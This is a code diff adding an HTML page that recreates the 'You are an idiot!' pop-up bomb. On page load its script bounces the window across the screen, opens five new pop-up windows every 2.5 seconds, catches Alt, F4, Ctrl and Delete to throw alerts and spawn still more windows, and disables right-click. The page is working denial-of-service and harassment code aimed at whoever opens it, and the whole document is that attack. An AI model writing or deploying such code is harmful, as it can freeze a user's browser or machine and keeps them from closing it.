@@ -1,0 +1,94 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+    <title>You are an idiot!</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+<body bgcolor="#ffffff" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" onload="startChaos()">
+    
+    <!-- The All-Important Images: Uses only one image for now -->
+    <div align="center">
+        <img id="theImg" src="flash.gif" alt="You are an idiot!" width="100%" height="100%">
+    </div>
+
+    <!-- Audio: The only thing IE4/IE5 understands for background audio -->
+    <bgsound id="bgAudio" src="idiot.mp3" loop="infinite">
+
+    <script language="Javascript">
+        // --- Legacy Chaos Variables ---
+        var isWhite = true;
+        var flagRun = 1;
+        var xOff = 5;
+        var yOff = 5;
+        var xPos = 400;
+        var yPos = -100;
+        var popupTimer;
+
+        // --- Start the Chaos ---
+        function startChaos() {
+            // Play audio (bgsound does it automatically, but just in case)
+            document.title = "You are an idiot!";
+            
+            // Start Bouncing Window
+            playBall();
+            
+            // Pop-up the windows (using the old school method)
+            procreate();
+            
+            // Keep spawning more!
+            popupTimer = setInterval("procreate()", 2500);
+        }
+
+        // --- 1. Bouncing Window ---
+        function playBall() {
+            if (flagRun != 1) return;
+            xPos += xOff;
+            yPos += yOff;
+            
+            if (xPos > screen.width - 357) xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+            if (xPos < 0) xOff = Math.ceil(7 * Math.random()) * 5 - 10;
+            if (yPos > screen.height - 330) yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
+            if (yPos < 0) yOff = Math.ceil(7 * Math.random()) * 5 - 10;
+            
+            window.moveTo(xPos, yPos);
+            setTimeout("playBall()", 1); // 1ms interval for ultra-fast bouncing
+        }
+
+        // --- 2. Pop-up Spawning ---
+        function openWindow(url) {
+            // The classic 1999 pop-up syntax
+            window.open(url, "_blank", "menubar=no,status=no,toolbar=no,resizable=no,width=357,height=330,titlebar=no,alwaysRaised=yes");
+        }
+
+        function procreate() {
+            for (var i = 0; i < 5; i++) {
+                openWindow('lol.html');
+            }
+        }
+
+        // --- 3. Keyboard Traps (Legacy Edition) ---
+        document.onkeydown = function() {
+            // Alt or F4
+            if (event.keyCode == 18 || event.keyCode == 115) {
+                alert("You are an idiot!");
+                procreate();
+            }
+            // Ctrl
+            if (event.keyCode == 17) {
+                alert("You are an idiot!");
+                procreate();
+            }
+            // Delete
+            if (event.keyCode == 46) {
+                alert("You are an idiot!");
+                procreate();
+            }
+        };
+
+        // --- 4. Disable Right Click ---
+        document.oncontextmenu = function() {
+            return false;
+        };
+    </script>
+</body>
+</html>
